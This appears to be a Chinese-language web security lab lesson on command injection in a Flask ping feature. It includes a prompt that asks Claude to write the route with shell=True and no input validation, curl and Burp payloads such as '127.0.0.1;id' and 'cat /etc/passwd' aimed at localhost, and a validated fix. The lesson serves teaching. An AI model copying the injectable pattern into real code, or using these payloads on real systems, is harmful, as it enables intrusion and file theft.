# Day 9 - 命令注入漏洞

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的功能基础上，继续增加 Ping 网络诊断功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增导入：import subprocess, platform

2. 新增路由 /ping，支持 GET 和 POST：
   - 需要登录才能访问（未登录时跳转到登录页）
   - GET 请求显示 ping 测试页面 ping.html
   - POST 请求从表单接收 ip 参数
   - 使用字符串拼接方式构建系统命令：f"ping -c 3 {ip}"
   - 使用 subprocess.check_output() 执行命令，设置 shell=True
   - 设置超时时间为 30 秒
   - 将命令执行结果返回给用户查看
   - 执行失败时也要返回错误输出

### 新增 templates/ping.html

Ping 测试页面，继承 base.html，包含：
- IP 地址输入框
- "Ping" 按钮
- 黑色背景绿色文字的控制台风格输出区域

### 修改 templates/base.html

- 在导航栏登录后的菜单中添加"Ping测试"链接

### 修改 templates/index.html

- 在已登录状态下的欢迎页面中添加"Ping测试"的快捷入口

### 代码规范要求
- 使用 shell=True 执行命令
- 使用 f-string 字符串拼接构建命令
- 不要对 ip 参数做任何过滤或校验
- 命令执行结果直接返回给用户

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 增加 Ping 网络诊断功能 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 用 curl 测试命令注入 | 见下方 POC |
| 5 | 分析代码，编写修复到 fix/command_runner_fix.py | 修复漏洞 |
| 6 | `git add -A && git commit -m "day-09: Ping功能 + 命令注入修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞：命令注入

```python
ip = request.form.get('ip')
# 用户输入直接拼接到命令中！
cmd = f"ping -c 3 {ip}"
result = subprocess.check_output(cmd, shell=True, timeout=30)
```

**问题**：
- `shell=True` 启用 shell 解释器，分号、管道符被解析为命令分隔符
- `ip` 参数未做任何过滤，直接拼接到命令字符串

### Shell 注入运算符

| 运算符 | 作用 | 示例 |
|--------|------|------|
| `;` | 顺序执行 | `127.0.0.1;id` |
| `\|` | 管道 | `127.0.0.1\|whoami` |
| `&&` | 前命令成功才执行后命令 | `127.0.0.1&&ls` |
| `\|\|` | 前命令失败才执行后命令 | `127.0.0.1\|\|id` |
| `` ` ` `` | 命令替换 | `` 127.0.0.1`id` `` |
| `$()` | 命令替换 | `127.0.0.1$(id)` |

---

## 四、POC 代码

### POC 1：正常 Ping

```bash
curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1"
```

**预期结果**：显示 ping 命令的正常输出。

### POC 2：分号注入

```bash
curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1;id"
```

**预期结果**：输出中包含 `uid=0(root)`，说明 id 命令被执行。

### POC 3：管道符注入

```bash
curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1|whoami"
```

**预期结果**：输出中包含 `root`。

### POC 4：多条命令组合

```bash
# 列出文件
curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1&&ls"

# 读取文件
curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1;cat /etc/passwd | head -5"
```

---

## 五、Burp Suite 测试方法

1. 登录后提交 Ping 表单
2. 在 Burp 中拦截 POST /ping 请求
3. 发送到 Repeater
4. 修改 ip 参数测试：
   - `127.0.0.1;id` → 执行 id 命令
   - `127.0.0.1|whoami` → 执行 whoami
   - `127.0.0.1;cat /etc/passwd` → 读取文件

---

## 六、POC 代码详细解释

### 为什么 shell=True 导致命令注入？

```python
# 安全的调用方式（无 shell）
subprocess.run(["ping", "-c", "3", "127.0.0.1;id"])
# ping 收到的参数是：["-c", "3", "127.0.0.1;id"]
# ping 尝试 ping 一个叫 "127.0.0.1;id" 的主机
# 安全！

# 危险的调用方式（有 shell）
subprocess.run(f"ping -c 3 127.0.0.1;id", shell=True)
# shell 收到的命令是：ping -c 3 127.0.0.1;id
# shell 先执行 ping，再执行 id
# 两条命令都执行了！
# 危险！
```

### 攻击流程

```
用户输入: 127.0.0.1;id

拼接后命令:
  ping -c 3 127.0.0.1;id

shell 解析:
  命令1: ping -c 3 127.0.0.1
  命令2: id

输出:
  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018ms
  ...
  uid=0(root) gid=0(root) groups=0(root)
```

---

## 七、修复方案

创建 `fix/command_runner_fix.py`：

```python
import subprocess
import ipaddress

def run_ping_fixed(ip):
    """修复：禁用 shell + IP 格式校验"""

    # 修复 1：校验输入必须是合法 IP 地址
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "无效的 IP 地址"

    try:
        # 修复 2：使用参数列表形式，禁用 shell
        result = subprocess.check_output(
            ["ping", "-c", "3", ip],  # 参数列表
            shell=False,               # 禁用 shell
            stderr=subprocess.STDOUT,
            timeout=30
        )
        return result.decode('utf-8', errors='replace')
    except subprocess.TimeoutExpired:
        return "命令执行超时"
    except Exception as e:
        return f"执行失败: {str(e)}"
```

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 正常ping | `ip=127.0.0.1` | ping 正常输出 |
| 2 | 分号注入 | `ip=127.0.0.1;id` | 显示 uid= |
| 3 | 管道注入 | `ip=127.0.0.1\|whoami` | 显示 root |
| 4 | 组合命令 | `ip=127.0.0.1&&ls` | 显示文件列表 |

---

## 九、课后任务

1. 测试分号 `;`、管道符 `|`、`&&` 三种注入方式
2. 尝试用命令注入读取 /etc/passwd
3. 对比 shell=True 和 shell=False 的安全性差异
4. 在 fix/ 目录下编写修复代码
5. 验证修复后 `127.0.0.1;id` 被拒绝
6. 提交到自己的个人分支
